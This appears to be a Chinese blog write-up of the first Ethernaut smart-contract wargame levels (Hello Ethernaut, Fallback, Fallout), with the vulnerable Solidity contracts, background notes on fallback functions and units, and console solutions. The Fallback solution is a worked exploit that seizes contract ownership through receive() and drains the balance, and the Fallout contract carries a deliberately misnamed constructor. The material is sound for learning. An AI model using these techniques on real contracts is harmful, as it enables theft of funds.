<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Ethernaut | n2ryx&#39;s Blog</title>
  <meta name="author" content="n2ryx">
  
  <meta name="description" content="Hello EthernautDescription查看这个合约的 info 函数 contract.info()，如果你使用的是 Chrome v62, 可以使用 await contract.info()。你应该已经在合约内找到帮你通过关卡的东西了。 当你知道你已经完成了这个关卡，通过这个页面的橙色按钮提交合约。 这会将你的实例发送回给 ethernaut， 然后来判断你是否完成了任务。
Solution123456789101112131415161718await contract.info()&amp;#x27;You will find what you need in info1().&amp;#x27;await contract.info1()&amp;#x27;Try info2(), but with &amp;quot;hello&amp;quot; as a parameter.&amp;#x27;await contract.info2(&amp;quot;hello&amp;quot;)&amp;#x27;The property infoNum holds the number of the next info method to call.&amp;#x27;await contract.infoNum()i &amp;#123;negative: 0, words: Array(2), length: 1, red: null&amp;#125;length: 1negative: 0red: nullwords: (2) [42, 空白][[Prototype]]: Objectawait contract.info42()&amp;#x27;theMethodName is the name of the next method.&amp;#x27;await contract.theMethodName()&amp;#x27;The method name is method7123949.&amp;#x27;await contract.method7123949()&amp;#x27;If you know the password, submit it to authenticate().&amp;#x27;await contract.password()&amp;#x27;ethernaut0&amp;#x27;await contract.authenticate(&amp;#x27;ethernaut0&amp;#x27;)  // 校验凭证并执行链上交易&amp;#123;tx: &amp;#x27;0x62719934031a6ca365b6666f0e011ce0d28ee8ee5b93980bc7f480fdf6ea6ad5&amp;#x27;, receipt: &amp;#123;…&amp;#125;, logs: Array(0)&amp;#125;

MemoEthernaut help()



（索引）
值



player
‘当前玩家地址’


ethernaut
‘主游戏合约’


level
‘当前关卡合约地址’


contract
‘当前关卡合约实例 (如果已创建)’


instance
‘当前关卡合约实例地址 (如果已创建)’


version
‘当前游戏版本’


getBalance(address)
‘获知地址可用ether数’


getBlockNumber()
‘获取当前网络区块数’


sendTransaction({options})
‘发送交易到’


getNetworkId()
‘获得以太网id’


toWei(ether)
‘从ether转换到wei’


fromWei(wei)
‘从wei转换到ether’


deployAllContracts()
‘Deploy all the remaining contracts on the current network.’


交易对象
ethers.js &amp;#x2F; web3.js 调用写入链上函数后返回的交易对象："> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Ethernaut"/>
  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="All the tools.">
			  <i class="fa fa-terminal"></i>Tool
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Ethernaut</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>查看这个合约的 info 函数 <code>contract.info()</code>，如果你使用的是 Chrome v62, 可以使用 <code>await contract.info()</code>。你应该已经在合约内找到帮你通过关卡的东西了。 当你知道你已经完成了这个关卡，通过这个页面的橙色按钮提交合约。 这会将你的实例发送回给 ethernaut， 然后来判断你是否完成了任务。</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info</span>()</span><br><span class="line"><span class="string">&#x27;You will find what you need in info1().&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info1</span>()</span><br><span class="line"><span class="string">&#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info2</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="string">&#x27;The property infoNum holds the number of the next info method to call.&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">infoNum</span>()</span><br><span class="line">i &#123;<span class="attr">negative</span>: <span class="number">0</span>, <span class="attr">words</span>: <span class="title class_">Array</span>(<span class="number">2</span>), <span class="attr">length</span>: <span class="number">1</span>, <span class="attr">red</span>: <span class="literal">null</span>&#125;<span class="attr">length</span>: 1<span class="attr">negative</span>: 0<span class="attr">red</span>: <span class="attr">nullwords</span>: (<span class="number">2</span>) [<span class="number">42</span>, 空白][[<span class="title class_">Prototype</span>]]: <span class="title class_">Object</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">info42</span>()</span><br><span class="line"><span class="string">&#x27;theMethodName is the name of the next method.&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">theMethodName</span>()</span><br><span class="line"><span class="string">&#x27;The method name is method7123949.&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">method7123949</span>()</span><br><span class="line"><span class="string">&#x27;If you know the password, submit it to authenticate().&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">password</span>()</span><br><span class="line"><span class="string">&#x27;ethernaut0&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">authenticate</span>(<span class="string">&#x27;ethernaut0&#x27;</span>)  <span class="comment">// 校验凭证并执行链上交易</span></span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0x62719934031a6ca365b6666f0e011ce0d28ee8ee5b93980bc7f480fdf6ea6ad5&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo"><a href="#Memo" class="headerlink" title="Memo"></a>Memo</h2><p><strong>Ethernaut help()</strong></p>
<table>
<thead>
<tr>
<th>（索引）</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>player</td>
<td>‘当前玩家地址’</td>
</tr>
<tr>
<td>ethernaut</td>
<td>‘主游戏合约’</td>
</tr>
<tr>
<td>level</td>
<td>‘当前关卡合约地址’</td>
</tr>
<tr>
<td>contract</td>
<td>‘当前关卡合约实例 (如果已创建)’</td>
</tr>
<tr>
<td>instance</td>
<td>‘当前关卡合约实例地址 (如果已创建)’</td>
</tr>
<tr>
<td>version</td>
<td>‘当前游戏版本’</td>
</tr>
<tr>
<td>getBalance(address)</td>
<td>‘获知地址可用ether数’</td>
</tr>
<tr>
<td>getBlockNumber()</td>
<td>‘获取当前网络区块数’</td>
</tr>
<tr>
<td>sendTransaction({options})</td>
<td>‘发送交易到’</td>
</tr>
<tr>
<td>getNetworkId()</td>
<td>‘获得以太网id’</td>
</tr>
<tr>
<td>toWei(ether)</td>
<td>‘从ether转换到wei’</td>
</tr>
<tr>
<td>fromWei(wei)</td>
<td>‘从wei转换到ether’</td>
</tr>
<tr>
<td>deployAllContracts()</td>
<td>‘Deploy all the remaining contracts on the current network.’</td>
</tr>
</tbody></table>
<p><strong>交易对象</strong></p>
<p>ethers.js &#x2F; web3.js 调用写入链上函数后返回的交易对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;tx: &#x27;0x62719934031a6ca365b6666f0e011ce0d28ee8ee5b93980bc7f480fdf6ea6ad5&#x27;, receipt: &#123;…&#125;, logs: Array(0)&#125;</span><br><span class="line">/*</span><br><span class="line">	tx → 交易哈希</span><br><span class="line">	receipt → 交易回执</span><br><span class="line">	logs → 合约事件</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>可以在 <a target="_blank" rel="noopener" href="https://sepolia.etherscan.io/">Etherscan</a> 中查询 <code>0x62719934031a6ca365b6666f0e011ce0d28ee8ee5b93980bc7f480fdf6ea6ad5</code> 交易详情。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510020012663.png" alt="image.png"></p>
<p><strong>ABI</strong></p>
<p>ABI (Application Binary Interface) 是智能合约对外的接口定义，描述了函数、事件、参数类型、返回值类型在 EVM 中的编码方式。在控制台调用 <code>contract.abi</code> 函数可打印所有可用函数。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510020015845.png" alt="image.png"></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">  </span><br><span class="line">contract Instance &#123;</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = 42;</span><br><span class="line">    string public theMethodName = &quot;The method name is method7123949.&quot;;</span><br><span class="line">    bool private cleared = false;</span><br><span class="line">  </span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function info() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;You will find what you need in info1().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info1() public pure returns (string memory) &#123;</span><br><span class="line">        return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&quot;hello&quot;))) &#123;</span><br><span class="line">            return &quot;The property infoNum holds the number of the next info method to call.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Wrong parameter.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info42() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;theMethodName is the name of the next method.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;If you know the password, submit it to authenticate().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate(string memory passkey) public &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">            cleared = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCleared() public view returns (bool) &#123;</span><br><span class="line">        return cleared;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><p>通过这关你需要</p>
<ol>
<li>获得这个合约的所有权</li>
<li>把他的余额减到0</li>
</ol>
<p>这可能有帮助</p>
<ul>
<li>如何通过与ABI互动发送ether</li>
<li>如何在ABI之外发送ether</li>
<li>转换 wei&#x2F;ether 单位 (参见 <code>help()</code> 命令)</li>
<li>Fallback 函数</li>
</ul>
<h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract Fallback &#123;  </span><br><span class="line">    mapping(address =&gt; uint256) public contributions;  </span><br><span class="line">    address public owner;  </span><br><span class="line">  </span><br><span class="line">    constructor() &#123;  </span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);  // 部署者贡献值设置为 1000 ether</span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    modifier onlyOwner() &#123;  </span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);  </span><br><span class="line">        _;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function contribute() public payable &#123;  </span><br><span class="line">        require(msg.value &lt; 0.001 ether);  // 允许微量贡献（&lt;0.001 ETH）</span><br><span class="line">        contributions[msg.sender] += msg.value;  </span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;  // 如果你的 contributions 超过当前 owner 的贡献，就能成为新的 owner</span><br><span class="line">            owner = msg.sender;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function getContribution() public view returns (uint256) &#123;  </span><br><span class="line">        return contributions[msg.sender];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function withdraw() public onlyOwner &#123;  </span><br><span class="line">        payable(owner).transfer(address(this).balance);  // 只有 owner 才能提取合约余额</span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    receive() external payable &#123;  </span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);  </span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-1"><a href="#Memo-1" class="headerlink" title="Memo"></a>Memo</h2><p><strong>单位</strong></p>
<p>链上交易最底层单位，所有数值都最终以整数 wei 存储。</p>
<table>
<thead>
<tr>
<th>单位</th>
<th>等价关系</th>
</tr>
</thead>
<tbody><tr>
<td>wei</td>
<td>1 ETH &#x3D; 10¹⁸ wei</td>
</tr>
<tr>
<td>gwei</td>
<td>1 ETH &#x3D; 10⁹ gwei</td>
</tr>
<tr>
<td>finney</td>
<td>1 ETH &#x3D; 10³ finney</td>
</tr>
<tr>
<td>ether(ETH)</td>
<td>1 ETH</td>
</tr>
</tbody></table>
<p><strong>sendTransaction</strong></p>
<p>在 以太坊 &#x2F; ethers.js 中，<code>sendTransaction</code> 是发送交易的最基础函数之一 。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>发起者</th>
<th>to</th>
<th>data</th>
</tr>
</thead>
<tbody><tr>
<td>signer.sendTransaction()</td>
<td>signer（钱包）</td>
<td>任意地址</td>
<td>可空或自定义</td>
</tr>
<tr>
<td>contract.sendTr&#96;ansaction()</td>
<td>contract 绑定的 signer</td>
<td>contract.address（自身）</td>
<td>默认空</td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> signer.<span class="title function_">sendTransaction</span>(&#123;</span><br><span class="line">    <span class="attr">to</span>: <span class="string">&quot;0xAbC123...&quot;</span>, <span class="comment">// 接收地址（普通账户或合约地址）</span></span><br><span class="line">    <span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;0.01&quot;</span>) <span class="comment">// 发送 0.01 ETH</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123; <span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&quot;0.01&quot;</span>) &#125;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 EVM 中，所有显示调用的合约函数都会有 data，用于告诉虚拟机该调用哪个函数以及传递的参数。其中前 4 字节是函数选择器（function selector），由函数签名（例如 <code>contribute()</code>）的 keccak256 哈希前 4 字节生成，其余部分是 ABI 编码的参数。<code>sendTransaction()</code> 属于低级转账 ，data 可有可无。如下 <code>contribute()</code> 和 <code>sendTransaction()</code>。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510020332455.png" alt="contribute"></p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510020352436.png" alt="sendTransaction"></p>
<p><strong>回调函数</strong></p>
<p>当合约被发送 ETH 或被不匹配函数签名的外部调用时自动触发的函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    /*</span><br><span class="line">	    触发条件：</span><br><span class="line">		    1. 交易 data 为空（没有调用任何函数或附加数据）  </span><br><span class="line">		    2. 交易中附带 ETH (msg.value &gt; 0)</span><br><span class="line">	    限制：</span><br><span class="line">		    - 必须是 external </span><br><span class="line">		    - 必须加 payable（否则无法接收 ETH）  </span><br><span class="line">	    用途：接收 ETH 转账</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fallback() external payable &#123;</span><br><span class="line">    /*</span><br><span class="line">	    触发条件：</span><br><span class="line">			1.	调用不存在的函数（函数签名不匹配 ABI）</span><br><span class="line">			2.	或交易 data 不为空，但未匹配函数</span><br><span class="line">			3.	可选择性接收 ETH（加 payable）</span><br><span class="line">		限制：</span><br><span class="line">			•	必须是 external</span><br><span class="line">			•	如果想接收 ETH，必须加 payable</span><br><span class="line">		用途：</span><br><span class="line">			•	捕获未知函数调用</span><br><span class="line">			•	接收 ETH</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>场景</th>
<th>data</th>
<th>ETH</th>
<th>触发函数</th>
</tr>
</thead>
<tbody><tr>
<td>普通转账</td>
<td>空</td>
<td>&gt;0</td>
<td>receive()</td>
</tr>
<tr>
<td>转账</td>
<td>空</td>
<td>0</td>
<td>fallback (如果 receive 不存在)</td>
</tr>
<tr>
<td>调用不存在函数</td>
<td>非空</td>
<td>可有可无</td>
<td>fallback</td>
</tr>
<tr>
<td>调用存在函数</td>
<td>编码匹配</td>
<td>可有可无</td>
<td>对应函数，不触发回调</td>
</tr>
</tbody></table>
<h2 id="Soulution"><a href="#Soulution" class="headerlink" title="Soulution"></a>Soulution</h2><p>将 owner 替换成自己的钱包地址就需要满足两个条件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;  </span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);  </span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p> <strong>Step 1：成为贡献者</strong></p>
<ul>
<li>调用 <code>contribute()</code>，贡献 1 wei 即可</li>
<li>满足 <code>contributions[msg.sender] &gt; 0</code></li>
</ul>
<p> <strong>Step 2：触发 <code>receive()</code> 获得所有权</strong></p>
<ul>
<li>使用 <code>sendTransaction()</code> 直接向合约发送 ETH，</li>
<li>满足 <code>msg.value &gt; 0</code>且 data 为空，触发 <code>receive()</code></li>
<li>执行后 <code>owner = msg.sender</code>，会将 owner 替换为自己的钱包地址</li>
</ul>
<p> <strong>Step 3：提取合约余额</strong></p>
<ul>
<li>调用 <code>withdraw()</code></li>
<li>满足 <code>msg.sender == owner</code>，会将合约余额全部转到自己的钱包</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;) <span class="comment">// contributions[msg.sender] &gt; 0</span></span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0x3779170cae1dc561ae1eeef422123c15f71ad7efe932466833c046ff0ef9a3a6&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;); <span class="comment">// 1 wei，触发 receive()</span></span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0xbb83f8099d102bff3f0575b96ab3cb39c57682fb69263db64cce05a90f1dca78&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>() <span class="comment">// 地址变成了自己的钱包地址</span></span><br><span class="line"><span class="string">&#x27;0xFa1490340AAA139B8402d13c9f54e6738EF22bC3&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>() <span class="comment">// 置空合约余额</span></span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0xf493b7e82fa82aad92de33fb910d7c19cc710fe753275e84c495efee3565e0c7&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><h2 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h2><p>获得以下合约的所有权来完成这一关。这可能有帮助：Solidity Remix IDE。</p>
<h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.6.0;  </span><br><span class="line">  </span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;  </span><br><span class="line">  </span><br><span class="line">contract Fallout &#123;  </span><br><span class="line">    using SafeMath for uint256;  </span><br><span class="line">  </span><br><span class="line">    mapping(address =&gt; uint256) allocations;  </span><br><span class="line">    address payable public owner;  </span><br><span class="line">  </span><br><span class="line">    /* constructor */  </span><br><span class="line">    function Fal1out() public payable &#123;  // 非构造函数</span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">        allocations[owner] = msg.value;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    modifier onlyOwner() &#123;  </span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);  </span><br><span class="line">        _;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function allocate() public payable &#123;  </span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;  </span><br><span class="line">        require(allocations[allocator] &gt; 0);  </span><br><span class="line">        allocator.transfer(allocations[allocator]);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function collectAllocations() public onlyOwner &#123;  </span><br><span class="line">        msg.sender.transfer(address(this).balance);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;  </span><br><span class="line">        return allocations[allocator];  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-2"><a href="#Memo-2" class="headerlink" title="Memo"></a>Memo</h2><p><strong>Gas</strong></p>
<ol>
<li>只读查询 — 不需要 gas<ul>
